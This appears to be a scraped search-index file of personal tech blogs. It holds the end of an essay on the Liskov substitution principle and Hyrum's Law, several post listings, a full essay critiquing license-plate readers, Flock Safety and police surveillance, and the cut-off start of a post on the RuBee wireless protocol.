correct. Then we know the following statements are true:</p> <pre><code>  1. caller.Pre &amp;&amp; stuff =&gt; super.Pre\n  2. super.Pre =&gt; super.Post\n  3. super.Post &amp;&amp; more_stuff =&gt; caller.Post\n</code></pre> <p>Now let's say we substitute <code>super</code> with <code>sub</code>, which is also correct. Here is what we now know is true: </p> <pre><code>  1. caller.Pre =&gt; super.Pre\n- 2. super.Pre =&gt; super.Post\n+ 2. sub.Pre =&gt; sub.Post\n  3. super.Post =&gt; caller.Post\n</code></pre> <p>When is <code>caller</code> still correct? When we can fill in the \"gaps\" in the chain, aka if <code>super.Pre =&gt; sub.Pre</code> and <code>sub.Post =&gt; super.Post</code>. In other words, if <code>sub</code>'s preconditions are weaker than (or equivalent to) <code>super</code>'s preconditions and if <code>sub</code>'s postconditions are stronger than (or equivalent to) <code>super</code>'s postconditions.</p> <p>Notice that I never actually said <code>sub</code> was from a subtype of <code>super</code>! The LSP conditions (at least, the contract rule of LSP) doesn't just apply to subtypes but can be applied in any situation where we substitute a function or block of code for another. Subtyping is a common place where this happens, but by no means the only! We can also substitute across time.Any time we modify some code's behavior, we are effectively substituting the new version in for the old version, and so the new version's contract must be compatible with the old version's to guarantee no existing code is broken.</p> <p>For example, say we maintain an API or function with two required inputs, <code>X</code> and <code>Y</code>, and one optional input, <code>Z</code>. Making <code>Z</code> required strengthens the precondition (\"input must have Z\" is stronger than \"input may have Z\"), so potentially breaks existing users of our API. Making <code>Y</code> optional weakens the precondition (\"input may have Y\" is weaker than \"input must have Y\"), so is guaranteed to be compatible.</p> <p>(This also underpins The robustness principle: \"be conservative in what you send, be liberal in what you accept\".)</p> <p>Now the dark side of all this is Hyrum's Law. In the below code, are <code>new</code>'s postconditions stronger than <code>old</code>'s postconditions? </p> <pre><code>def old():\n    return {\"a\": \"foo\", \"b\": \"bar\"}\n\ndef new():\n    return {\"a\": \"foo\", \"b\": \"bar\", \"c\": \"baz\"}\n</code></pre> <p>On a first appearance, this is a strengthened postcondition: <code>out.contains_keys([a, b, c]) =&gt; out.contains_keys([a, b])</code>. But now someone does this:</p> <pre><code>my_dict = {\"c\": \"blat\"} \nmy_dict |= new()\nassert my_dict[c] == \"blat\"\n</code></pre> <p>Oh no, their code now breaks! They saw <code>old</code> had the postcondition \"<code>out</code> does NOT contain \"c\" as a key\", and then wrote their code expecting that postcondition. In a sense, any change the postcondition can potentially break someone. \"All observable behaviors of your system will be depended on by somebody\", as Hyrum's Law puts it.</p> <p>So we need to be explicit in what our postconditions actually are, and properties of the output that are not part of our explicit postconditions are subject to be violated on the next version. You'll break people's workflows but you also have grounds to say \"I warned you\".</p> <p>Overall, Liskov and Wing did their work in the context of subtyping, but the principles are more widely applicable, certainly to more than just the use of inheritance.</p> <ol> <li> <p>Though they restrict it to just safety properties. \u21a9</p> </li> <li> <p>The paper lists a couple of other authors as introduce the idea of \"contra/covariance rules\", but part of being \"off-the-cuff and casual\" means not diving into every referenced paper. So they might have gotten the pre/postconditions thing from an earlier author, dunno for sure! \u21a9</p> </li> <li> <p>I believe that this is equivalent to the formal methods notion of a refinement. \u21a9</p> </li> </ol>"},{"location":"chadnauseam.com/","title":"chadnauseam.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>chewier-foods-for-children</li> <li>my-rustfmt-toml</li> <li>semaglutide-has-changed-the-world</li> <li>solving-macro</li> <li>whats-wrong-with-a-for-loop</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"chadnauseam.com/chewier-foods-for-children/","title":"chewier-foods-for-children","text":"<p>\u6765\u6e90: chadnauseam.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://chadnauseam.com/random/chewier-foods-for-children</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:09</p>"},{"location":"chadnauseam.com/my-rustfmt-toml/","title":"my-rustfmt-toml","text":"<p>\u6765\u6e90: chadnauseam.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://chadnauseam.com/coding/tips/my-rustfmt-toml</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"chadnauseam.com/semaglutide-has-changed-the-world/","title":"semaglutide-has-changed-the-world","text":"<p>\u6765\u6e90: chadnauseam.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://chadnauseam.com/random/semaglutide-has-changed-the-world</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:09</p>"},{"location":"chadnauseam.com/solving-macro/","title":"solving-macro","text":"<p>\u6765\u6e90: chadnauseam.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://chadnauseam.com/economics/solving-macro</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:10</p>"},{"location":"chadnauseam.com/whats-wrong-with-a-for-loop/","title":"whats-wrong-with-a-for-loop","text":"<p>\u6765\u6e90: chadnauseam.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://chadnauseam.com/coding/tips/whats-wrong-with-a-for-loop</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:10</p>"},{"location":"chiark.greenend.org.uk/~sgtatham/","title":"chiark.greenend.org.uk/~sgtatham\\n\\n\u7f51\u7ad9: https://www.chiark.greenend.org.uk/~sgtatham\\nRSS: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/feed.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Aperiodic Tilings V- the Refinable Frontier_20260205\\n- Brute-forcing Langley\u2019s geometry problem with field extensions_20260205\\n- In which I have Opinions about parsing and grammars_20260205\\n- Policy of transience_20260205\\n- Iconography of the PuTTY tools_20260205\\n","text":""},{"location":"chiark.greenend.org.uk/~sgtatham/Aperiodic%20Tilings%20V-%20the%20Refinable%20Frontier_20260205/","title":"Aperiodic Tilings V: the Refinable Frontier\\n\\n\u6765\u6e90: https://www.chiark.greenend.org.uk/~sgtatham\\n\u94fe\u63a5: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/aperiodic-refine/\\n\u65e5\u671f: 2025-09-02T00:00:00+00:00\\n\\n---\\n\\nA sequel to my previous posts on finite-state transducers for aperiodic tilings: if you have a tiling you can\u2019t build a transducer for, here\u2019s an algorithm to turn it into one you can.","text":""},{"location":"chiark.greenend.org.uk/~sgtatham/Brute-forcing%20Langley%E2%80%99s%20geometry%20problem%20with%20field%20extensions_20260205/","title":"Brute-forcing Langley\u2019s geometry problem with field extensions\\n\\n\u6765\u6e90: https://www.chiark.greenend.org.uk/~sgtatham\\n\u94fe\u63a5: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/adventitious/\\n\u65e5\u671f: 2025-07-18T00:00:00+00:00\\n\\n---\\n\\nAn application of algebraic extensions of the rationals: cheating (arguably) at elementary geometry puzzles.","text":""},{"location":"chiark.greenend.org.uk/~sgtatham/Iconography%20of%20the%20PuTTY%20tools_20260205/","title":"Iconography of the PuTTY tools\\n\\n\u6765\u6e90: https://www.chiark.greenend.org.uk/~sgtatham\\n\u94fe\u63a5: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/\\n\u65e5\u671f: 2025-03-12T00:00:00+00:00\\n\\n---\\n\\nA PuTTY user asked about the history of its logo and icon collection. I discuss the design intentions and technical aspects.","text":""},{"location":"chiark.greenend.org.uk/~sgtatham/In%20which%20I%20have%20Opinions%20about%20parsing%20and%20grammars_20260205/","title":"In which I have Opinions about parsing and grammars\\n\\n\u6765\u6e90: https://www.chiark.greenend.org.uk/~sgtatham\\n\u94fe\u63a5: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/parsing/\\n\u65e5\u671f: 2025-06-05T00:00:00+00:00\\n\\n---\\n\\nA collection of semi-connected rants about context-free grammars, parser generators, and the ways in which they aren\u2019t quite as useful as I\u2019d like them to be.","text":""},{"location":"chiark.greenend.org.uk/~sgtatham/Policy%20of%20transience_20260205/","title":"Policy of transience\\n\\n\u6765\u6e90: https://www.chiark.greenend.org.uk/~sgtatham\\n\u94fe\u63a5: https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/transience/\\n\u65e5\u671f: 2025-05-09T00:00:00+00:00\\n\\n---\\n\\nA description of some of my personal computing habits, focusing on avoiding things \u2018just turning out\u2019 to last for ever in a disorganised manner.","text":""},{"location":"computer.rip/","title":"computer.rip\\n\\n\u7f51\u7ad9: https://computer.rip\\nRSS: https://computer.rip/rss.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- the essence of frigidity_20260205\\n- air traffic control- the IBM 9020_20260205\\n- Flock and Urban Surveillance_20260205\\n- speed reading (the meaning of language)_20260205\\n- RuBee_20260205\\n","text":""},{"location":"computer.rip/Flock%20and%20Urban%20Surveillance_20260205/","title":"Flock and Urban Surveillance\\n\\n\u6765\u6e90: https://computer.rip\\n\u94fe\u63a5: https://computer.rip/2025-12-26-Flock-and-Urban-Surveillance.html\\n\u65e5\u671f: 26 Dec 2025 00:00:00 UT\\n\\n---\\n\\nSome years ago, I had a frustrating and largely fruitless encounter with the","text":"<p>politics of policing. As a member of an oversight commission, I was particularly interested in the regulation of urban surveillance. The Albuquerque Police Department, for reasons good and bad, has often been an early adopter of surveillance technology. APD deployed automated license plate readers, mounted on patrol cars and portable trailers, in 2013. Initially, the department kept a six-month history of license plate data. For six months, police could retrospectively search the database to reconstruct a vehicle, or person's, movements\u2014at least, those movements that happened near select patrol cars and \"your speed is\" trailers. Lobbying by the American Civil Liberties Union and public pressure on APD and city council lead to a policy change to retain data for only 14 days, a privacy-preserving measure that the ACLU lauded as one of the best ALPR policies in the nation.\\nToday, ALPR is far more common in Albuquerque. Lowering costs and a continuing appetite for solving social problems with surveillance technology means that some parts of the city have ALPR installed at every signalized intersection\u2014every person's movements cataloged at a resolution of four blocks. The data is retained for a full year. Some of it is offered, as a service, to law enforcement agencies across the country.\\nOne of the most frustrating parts of the mass surveillance debate is the ability of law enforcement agencies and municipal governments to advance wide-scale monitoring programs, weather the controversy, and then ratchet up retention and sharing after public attention fades. For years, expansive ALPR programs spread through most American cities with little objection. In my part of the country, it seemed that the controversy over ALPR had been completely forgotten until one particularly significant ALPR vendor\u2014Flock Safety\u2014started repeatedly stepping in long-festering controversies with such wild abandon that they are clearly either idiots or entirely unconcerned about public perception.\\nI try not to be too cynical but I am, unfortunately, more inclined to the latter. Companies like Flock know that they are in treacherous territory, morally and legally. They know that their customers are mostly governments or organizations with elected leaders that are subject to popular opinion. They know that helping Texas law enforcement track down abortion seekers in other states is a \"bad look.\" They know all of these things, but they do not particularly care. They don't have to care: decades of incipient corruption, legal and political maneuvering, and the routine inefficacy of municipal politics has created an environment where public opinion doesn't matter.\\nI can't definitely tell you where public opinion lies on ALPR, although it seems like the average person might be mildly in support. From at least my experience, in my corner of the world, I will tell you this: it doesn't matter. Police departments and the means by which they purchase and field technology are so isolated from the political process that it is extremely difficult to imagine a scenario where voters could affect change. Year by year, city by city, the police become more dug in. Law enforcement agencies across the country have found that the most straightforward way to address privacy concerns around surveillance technology is to keep the department's purchase and deployment of that technology a secret. Most city governments at least passively support this approach. The vendors of surveillance systems facilitate, support, and even demand secrecy through their contract terms.\\nMore recently, Las Vegas and the Bay Area have offered a model even more opaque to public scrutiny: law enforcement surveillance technology is simply purchased by wealthy private donors, almost invariably from the software industry, and then either the systems or their use are donated to the city. If carefully designed, these programs can be completely exempt from public information rules. They can take the form, for example, of a business association that runs its own private surveillance state, involving the public and ostensibly accountable police only when an arrest is made. We are privatizing mass surveillance.\\nFlock continues to generate enormous press, mostly on the back of persistent investigation by 404 Media. More recently, security researchers have published significant defects in the design of Flock's technology that can make the original video publicly accessible. Just about every time that someone looks into Flock, the company turns out to be less ethical, the users less concerned about compliance, the design of the system itself less competent than charitable viewers had assumed.\\nI'm trying not to be a doomer for Christmas, but I am sometimes frustrated with Flock coverage because it can miss the entire history of this issue. I think that a more contextually complete discussion of urban surveillance could be useful. And I am sitting in a coffee shop, in a trendy part of town, looking out the window at a PTZ camera on the side of a traffic light. That camera, I know, is owned and operated by APD's Real Time Crime Center (RTCC). Between the police department itself, city agencies that participate in the RTCC, and businesses that volunteer real-time access to their surveillance, there are thousands of others like it. Courtesy of a transit station, there are at least a dozen within my view.\\nWhether or not this is a good or bad idea, whether or not it is effective in reducing crime, whether or not it will be leveraged against political opposition; these are tricky questions. I suppose what worries me is that it feels like hardly anyone is asking them any more. It took Flock's remarkable ability to step on rakes and the apparent victory of fascism in national politics for anyone to remember that the construction of ubiquitous surveillance is a project that started many years ago, and that has proceeded largely unhindered ever since.\\nDomestic Signals Intelligence\\nWithin the tech community, there has historically been much attention to the ability to track people by passively observing Bluetooth traffic. This technique has been widely used, both in commercial and government applications. There are popular \"smart city\" street lighting systems, for example, that allow every street light to passively collect signatures of the people passing underneath it. To my knowledge, these techniques are not actually very widely used by law enforcement. There are, perhaps, two reasons: one of mechanisms of government, the other of countermeasures.\\nFirst, \"smart city\" data collection systems are usually funded and deployed by municipal works or environmental departments. While police could make arrangements for access to that data, those arrangements would require the kind of inter-agency Memoranda of Understanding that tend to lead to far more public scrutiny than police acquisitions of surveillance products. Besides, since they aren't deployed for law enforcement purposes, they're often not useful sources for the areas that law enforcement find most interesting: higher-crime areas that are usually lower-income and, thus, less likely to have working street lights at all\u2014much less \"smart\" ones. Besides, smartphones have widely adopted randomization of Bluetooth and WiFi identifiers, and protocol revisions have reduced the number of identifiers transmitted in plaintext. Passive signals intelligence just doesn't work as well as it used to, at least at the capability level of a municipality.\\nTalking about Bluetooth and WiFi on phones does raise the question of the \"phone\" part, the cellular interface, which is targeted by the family of devices often known as \"Stingrays\" after the trademark of a particular manufacturer. Fortunately, improvements in the security design of cellular protocols is making these less effective over time. Unfortunately, the technology continues to advance, sometimes undoing the improvements of newer GSM revisions. Federal and local law enforcement continue to purchase and use these devices, largely in secret, benefiting from a particular model of federal ownership/local use that makes it especially difficult to get a police department to even confirm or deny that they have ever deployed them. \"Stingrays\" or IMSI surveillance is mostly a shadow world of rumors and carefully worded non-denials. Despite technical measures against them, they are clearly still in use, and thus clearly still useful.\\nOptics\\nOut in the rest of the world, visual surveillance is more salient than radio. Early rollouts of police-operated surveillance, dating back to at least the 1970s, generated some controversy over privacy implications. Two things have since happened: first, law enforcement have relied on an increasing number of public-private partnerships and commercial vendors to gain access to surveillance without directly owning it. Second, police video surveillance has largely been normalized, and no longer faces much opposition or even public notice.\\nOne of the interesting changes here is one of visibility: police video surveillance has often edged in and out of public awareness to fit the politics. In periods of pro-privacy, anti-surveillance sentiment, departments rely more on voluntary arrangements for access to cameras installed by others. In periods of pro-police, anti-crime sentiment, departments install cameras with flashing lights and police badges. Both types tend to persist after the next change in the tide.\\nThe public usually knows little about these systems, a result of intentional opacity by police departments and a general lack of interest by the press. That leads to a lot of confusion. Where I live, we\\ndo\\nhave an extensive network of police-operated cameras on intersection traffic signal arms. And yet, if you ask the average person to identify a police surveillance camera, they will point to the camera for the traffic signal's video-based lane occupancy sensing every single time. That's not a a police camera, it's barely even a camera as the video is rarely retained. All of these people, it seems, have worked themselves into a sort paranoia where they think that every camera is an eye of the police. Well, the police\\nare\\nwatching them, from about ten feet over. The \"speed dome\" PTZ cameras get so much less attention, perhaps because they are usually mounted on the pole further from sightline, or perhaps because they are of a type more common for commercial surveillance systems that we have learned to simply ignore.\\nVideo surveillance is an interesting topic to me, philosophically. I am largely unconcerned with the privacy implications of most video surveillance installations (such as the one on my own house) because, historically, the video was recorded locally and generally reviewed only when there was a specific reason. The simple fact that reviewing large amounts of video is so time consuming meant that the pervasive surveillance potential of video surveillance was, at one time not so long ago, quite limited.\\nOf course, the age of the computer has somewhat changed that situation. There are two phenomenon of the automation of surveillance that I think should be considered separately: first, machine vision has improved to an extent that computers can automatically process surveillance video to extract events and identities. Second, the appified, everything-social-media attitude of consumer products creates new dynamics in access to surveillance data, and those dynamics are spreading upwards into the commercial segment.\\nMachine Vision\\nHistorically, much of the attention to video pervasive surveillance has centered around facial recognition. Facial recognition has indeed been applied to video surveillance for years, but I think that the average person vastly overestimates how effective and widely used facial recognition is.\\nThe vast majority of currently installed surveillance cameras do not produce video of sufficient quality for facial recognition. That has less to do with the quality of the video itself (although that is poorer than you think for most real systems) and more to do with the way that surveillance cameras are used and installed. Most cameras are positioned high up with wide coverage of a room; this perspective is ideal for reconstructing a series of events but just about the worst case for facial recognition. For most surveillance cameras, human faces are small and at indirect angles. There is little geometry that you can extract from a face that is about ten pixels wide and subjected to aggressive h264 compression, which is how most surveillance video comes out.\\nPractical facial recognition systems involve cameras installed specifically for that purpose, roughly at eye level where they will get close-up, straight-on images of people who pass by. Next time you visit a bank branch, look by the exit doors for a conspicuously thick height strip. Height strips by exit doors were invented to allow clerks to give police a more accurate description of a robber, but they have since evolved to serve largely as subterfuge. Somewhere around 5' 6\", you will notice a small hole, and behind that hole is a camera. Several manufacturers offer these and they seem very popular in financial services.\\nKroger is more to the point: they've just been installing dome cameras right at eye height on their exit doors, for at least a decade.\\nWhen discussing surveillance, it's important to remember that the vast majority of real-world video surveillance systems are old, inexpensive, and poorly maintained. Even where cameras are installed specifically for a good view of faces, there probably isn't any facial recognition in use, most of the time. Facial recognition products are expensive and don't currently manifest many benefits unless the organization is large enough to have a security department to work with the resulting data, which requires a degree of operational maturity beyond most surveillance users (e.g. gas stations).\\nAll of that said, there are plenty of real-world facial recognition deployments. Rite Aid, for example, prominently rolled out facial recognition to flag known shoplifters at their stores... a rollout that went so poorly that it lead to a lawsuit and an FTC settlement including the end of the facial recognition program and a five-year moratorium on further attempts. This is not to say that facial recognition on video surveillance isn't legal (although in some states it isn't or at least requires a lot of disclosure), but there is definitely a degree of legal and reputational hazard involved.\\nThe ACLU has periodically conducted call-around surveys on use of facial recognition. The most notable trend is that most large chains now refuse to talk about it. I could be wrong, but my experience with corporate communications behavior leads to me to interpret a refusal to comment along these lines: Home Depot, for example, is a very large company that will have various initiatives underway, and either confirming or denying their use of facial recognition would probably be wrong in some cases and expose them to compliance or legal risk in others. I would bet good money that Home Depot has some facial recognition technology deployed at some locations, but knowing how slowly security technology tends to roll out in that kind of company and how complicated the legal and compliance situation can become, it's probably limited. They are probably acutely aware of the controversy surrounding this type of surveillance and, given the example of Rite Aid, the ways a rollout could go wrong. That means that surveillance will spread slowly.\\nBut it will spread. At this point, I think it is inevitable that facial recognition will become widely used in video surveillance. I just think the point at which \"facial recognition is everywhere\" remains some years away, due to all the normal reasons: technical limitations, slow-moving bureaucracies, and a somewhat complex and unclear regulatory situation. It will inevitably happen, for the same reasons as well: aggressive sales by facial recognition vendors.\\nThere are some sectors where facial recognition is very common, although I don't get the impression that retail is one of these yet. Casinos, for example\u2014some of the larger Las Vegas casinos have reportedly had facial recognition systems in use for decades, and Nevada law is very permissive of them. Casinos are, of course, pretty much ideal users. Large institutions with a lot of financial risk and large, sophisticated security departments. Few other businesses outside of Target can compete with the size and sophistication of casino security departments. There's a whole lot of money flying around, and they can spend some of it on expensive per-camera licensing without much leadership objection.\\nLicense Plate Reading\\nPopular attention to facial recognition has mostly fallen away as industry and media focus has shifted to another application of machine vision that is, it turns out, a whole lot easier: license plates. License plates are designed for readability, and most states use retroreflective paints that give you an absolutely beautiful high-contrast image under coaxial (i.e. mounted alongside the camera) infrared illumination. There's not much that is easier to read by machine vision. Automated license plate readers have been available for quite a long time: US CBP had an experimental ALPR installation at a Texas border crossing in 1994. That system was actually deemed a failure and removed, but technology improved and there were permanent installations at larger border crossings by the end of the 1990s.\\nFor a long time, the dominant vendor of ALPR equipment in the US was Motorola. Motorola's product line remains popular for vehicle-mounted systems, but the high price of the cameras, controllers, and software package had a side benefit of limiting the pervasiveness of ALPR. The equipment was just too expensive to put up all over the place.\\nIn Albuquerque, for example, the ALPR program long consisted of Motorola systems mounted on portable \"your speed is\" trailers. The portable nature of these setups made the expense more worthwhile, and besides, portability has its own utilities: an APD detective once told me, for example, of how they would leave ALPR trailers in front of the houses of people suspected to lead criminal gangs. While there was value in the intelligence collection, the main motivation was intimidation: while you might call the \"your speed is\" trailers a concealed system, they're not all that subtle, and one supposes that most vehicle-based criminals (the main kind here) are aware that they function as the eyes of the police.\\nAt some point, in response to growing budgets or lowered costs I'm not sure, APD began installing fixed Motorola ALPR systems on the light arms of major intersections. I know of around a dozen installations of this type in Albuquerque, which is the beginning of a widespread capability to monitor public movements but not exactly the dystopian pervasive surveillance of\\nMinority Report.\\nALPR works pretty well, but it is not perfect. Cameras need to be installed with fairly narrow optics aimed at the right spot, and infrared illumination makes reading far more reliable. Speaking of Las Vegas, I used to use a certain casino parking garage with an ALPR-based payment system with some regularity. It printed the license plate, as read by the ALPR, on the parking ticket, which is why I know that it was almost comically inept at reading my very legible California plate. It always got about half the characters wrong. I have gotten much better results in my own home experiments with budget equipment, so I figure that system must have been very poorly installed or maintained, but I'm sure there are plenty of others out there just like it.\\nThat's the tricky thing about video surveillance, from the \"blue team\" side of the house: people don't tend to pay a lot of attention to it until there's been an incident, at which point they find out that the lens has had mud on it for the last three months (a much bigger problem with ALPR cameras that used to be mounted pretty low to the ground for a better look angle). I bring this up because I think that people tend to vastly overestimate the quality of real-world video surveillance, and I like to take every opportunity to remind people that the main failure case of retail video surveillance used to be failure to replace the continuous-loop tape cassette before it was completely demagnetized by repeated recording. Now, in 2025, the continuous-loop tape cassettes are pretty much gone, but maintenance practices haven't improved. Lots of the cameras you see in public only barely work or don't work at all. So it goes.\\nFlock\\nIn 2017, though, a VC-backed (and specifically YCombinator) company called Flock Safety introduced a bold new idea to ALPR: a Silicon Valley sales model. Flock's system is built to be low-cost, and the sensors are smaller, simpler, and cheaper than Motorola's. I suppose they might be less effective as a result, but a reduced \"catch\" rate doesn't really detract from mass-surveillance ALPR installations that much. Flock has also greatly expanded their customer base, emphasizing sales to private organizations as well as law enforcement and government. Speaking of Home Depot, for example, Home Depot seems to have installed their own Flock cameras in all of their parking lots. Lowes Home Improvement has done the same.\\nI wanted to know more definitely how much Flock systems cost, because I suspected they were making significant inroads just through low pricing. It's a little tricky to say definitively because Flock is a \"call for quote\" kind of company and I think they offer contracts on different price bases. Scouring contracting documents, meeting notes, etc., it seems like a \"typical\" cost for a Flock camera is around $4,000 with about $3,000 a year in per-camera software licensing fees.\\nThat might seem expensive but it compares well to the five-figure prices I have heard associated with Motorola systems, especially since the Flock offering is more \"white glove\" with installation and maintenance packaged. Motorola systems are usually purchased through an integrator who adds their own considerable margin.\\nFlock also designs their cameras to be amenable to solar power, which radically reduces install costs compared to Motorola systems that usually need a utility worker out to splice power from a streetlight. More even than a price reduction, it makes Flock cameras much more available to organizations like HOAs that control territory in a sense but do not have the full bucket truck or utility work order capabilities of a municipal government.\\nAnother recent innovation in ALPR is less traceable to Flock but certainly seems associated with them: flexible funding sources. Police departments have limited budgets with which to acquire new technology, and technology vendors have to compete with other budget priorities like salaries, vehicles, and black-on-black tactical vinyl jobs for those vehicles. ALPR seems especially attractive for public-private partnership mechanisms, so there are a lot of Flock installations that were funded by business associations, HOAs, neighborhood associations, and other \"indirect\" sources. Some of these systems are owned and operated by the police with only the funding donated, others are owned and operated by the private group that paid for them. This can result in curious deployment decisions: sometimes the lowest-crime neighborhoods are the most replete with ALPR, as they tend to be wealthier and more politically organized communities with the wherewithall to put up the money.\\nThe most important thing to understand about Flock, though, is that it has built on Amazon's concept of \"Ring neighbors\" to build a sort of nationwide, ALPR-centric Nextdoor. Flock customers can basically check a box that allows other Flock customers to access data from their sensors, and of course Flock strongly encourages users to turn sharing on. While there are some audit and access controls available on Flock data sharing, they seem like pretty minimal efforts that are often ignored.\\nFlock sharing has generated a lot of press, especially with some dramatic examples like use by a Texas sheriff to locate an abortion patient and use by ICE/CBP to track suspects. These are both examples that raise one of the most alarming aspects of the Flock situation: many states and municipalities have laws in place that limit or at least monitor collaboration of local police with other police agencies and federal law enforcement. Some people find this surprising, but it's important to understand that the United States is a republic of nominally independent governments. Laws, policies, and priorities can vary greatly from jurisdiction to jurisdiction. There is a specific historical thread, related to the tracing of escaped slaves, that has made resource sharing between different law enforcement agencies a known area of moral and legal treachery for a very long time.\\nAnd yet, it turns out, most Flock customers seem to have sharing turned on, possibly entirely without their knowledge. There are now multiple well-established cases of local law enforcement agencies violating state laws by having data sharing with ICE/CBP enabled. It is possible for Flock users to turn off or restrict sharing, but I think a lot of them honestly don't know that. Some state Attorneys General have ordered Flock users to disable sharing, some have restricted or banned Flock products entirely, but in general it's a very messy situation. It appears that a lack of care by law enforcement and other Flock customers, facilitate and no doubt encouraged by Flock's motivation towards \"network effect\" lock-in, has resulted in widespread and brazen violation of privacy laws that is only now making its way to the courts.\\nIn other words, the tech industry happened.\\nAcoustics\\nI will not spend much time here discussing wide-area acoustic surveillance like ShotSpotter, in part because\\nI have written a bit about it before\\n. It's a complex issue: a well-designed gunshot detection system would probably be a good thing, but I find SoundThinking (manufacturer of the ShotSpotter system) to be profoundly untrustworthy.\\nFutures\\nThe changes we are already seeing will continue: ALPR will become more ubiquitous, facial recognition will advance further into the public sphere, and the tech industry will continue to centralize data and facilitate queries by law enforcement. There's a lot of money to me made out of the whole thing, and funding towards law enforcement or public safety purchases are usually politically safe. Pretty much everything is stacked in the direction of more pervasive surveillance in the United States.\\nDo you find that upsetting? It seems that some people do, and some people do not. I am probably not as opposed to surveillance of public spaces as the most vocal privacy advocates, but I am also convinced that vendor-enabled mass surveillance technology like Flock is subject to enormous abuse and will inevitably undermine constitutional protections. Unfortunately, vocal organizing against mass surveillance has become pretty limited. The ACLU is doing a lot of good work in this area, but I don't see much public organizing.\\nThe best thing you can do is probably to advocate for transparency. The most alarming part of this whole thing, to me, is the way that police departments have brazenly structured purchases of surveillance technology to get around public record and approval requirements. Companies like Flock and SoundThinking encourage this, and write it into their contracts. The end result is that many police departments have installed cameras and microphones in all kinds of places, and will not disclose when, where, how many, or how they are used. We should not allow that kind of secrecy, but preventing it seems to require legislation. The federal situation seems like a loss, so the best pressure point might be to lobby for municipal or state legislation that will require police departments to disclose their surveillance programs. Even better would be a requirement for review and approval of surveillance purchases, but unfortunately that kind of rule often already exists and police departments still structure their purchase arrangements to avoid invoking it.\\nI suppose the bottom line is this: keep bringing it up. Mass surveillance in the US often feels like a lost cause, but I suppose it's only lost if we give up. It doesn't take that many people showing up at a city council meeting to make something a priority to the councilors; and perhaps the police can only stonewall for so long. It's worth a shot.</p>"},{"location":"computer.rip/RuBee_20260205/","title":"RuBee\\n\\n\u6765\u6e90: https://computer.rip\\n\u94fe\u63a5: https://computer.rip/2025-11-22-RuBee.html\\n\u65e5\u671f: 22 Nov 2025 00:00:00 UT\\n\\n---\\n\\nI have at least a few readers for which the sound of a man's voice saying","text":"<p>\"government cell phone detected\" will elicit a palpable reaction. In Department of Energy facilities across the country, incidences of employees accidentally carrying phones into secure areas are reduced through a sort of automated nagging. A device at the door monitors for the presence of a tag; when the tag is detected it plays an audio clip. Because this is the government, the device in question is highly specialized, fantastically expensive, and says \"government cell phone\" even though most of the phones in question are personal devices. Look, they already did the recording, they're not changing it now!\\nOne of the things that I love is weird little wireless networks. Long ago I wrote about\\nANT+\\n, for example, a failed personal area network standard designed mostly around fitness applications. There's tons of these, and they have a lot of similarities---so it's fun to think about the protocols that went down a completely different path. It's even better, of course, if the protocol is obscure outside of an important niche. And a terrible website, too? What more could I ask for.\\nThe DoE's cell-phone nagging boxes, and an array of related but more critical applications, rely on an unusual personal area networking protocol called RuBee.\\nRuBee is a product of Visible Assets Inc., or VAI, founded in 2004\\n1\\nby John K. Stevens. Stevens seems a somewhat improbable founder, with a background in biophysics and eye health, but he's a repeat entrepreneur. He's particularly fond of companies called Visible: he founded Visible Assets after his successful tenure as CEO of Visible Genetics. Visible Genetics was an early innovator in DNA sequencing, and still provides a specialty laboratory service that sequences samples of HIV in order to detect vulnerabilities to antiretroviral medications.\\nClinical trials in the early 2000s exposed Visible Genetics to one of the more frustrating parts of health care logistics: refrigeration. Samples being shipped to the lab and reagents shipped out to clinics were both temperature sensitive. Providers had to verify that these materials had stayed adequately cold throughout shipping and handling, otherwise laboratory results could be invalid or incorrect. Stevens became interested in technical solutions to these problems; he wanted some way to verify that samples were at acceptable temperatures both in storage and in transit.\\nMoreover, Stevens imagined that these sensors would be in continuous communication. There's a lot of overlap between this application and personal area networks (PANs), protocols like Bluetooth that provide low-power communications over short ranges. There is also clear overlap with RFID; you can buy RFID temperature sensors. VAI, though, coined the term\\nvisibility network\\nto describe RuBee. That's visibility as in asset visibility: somewhat different from Bluetooth or RFID, RuBee as a protocol is explicitly designed for situations where you need to \"keep tabs\" on a number of different objects. Despite the overlap with other types of wireless communications, the set of requirements on a visibility network have lead RuBee down a very different technical path.\\nVisibility networks have to be highly reliable. When you are trying to keep track of an asset, a failure to communicate with it represents a fundamental failure of the system. For visibility networks, the ability to actually convey a payload is secondary: the main function is just reliably detecting that endpoints exist. Visibility networks have this in common with RFID, and indeed, despite its similarities to technologies like BLE RuBee is positioned mostly as a competitor to technologies like UHF RFID.\\nThere are several differences between RuBee and RFID; for example, RuBee uses active (battery-powered) tags and the tags are generally powered by a complete 4-bit microcontroller. That doesn't necessarily sound like an advantage, though. While RuBee tags advertise a battery life of \"5-25 years\", the need for a battery seems mostly like a liability. The real feature is what active tags enable: RuBee operates in the low frequency (LF) band, typically at 131 kHz.\\nAt that low frequency, the wavelength is very long, about 2.5 km. With such a long wavelength, RuBee communications all happen at much less than one wavelength in range. RF engineers refer to this as near-field operation, and it has some properties that are intriguingly different from more typical far-field RF communications. In the near-field, the magnetic field created by the antenna is more 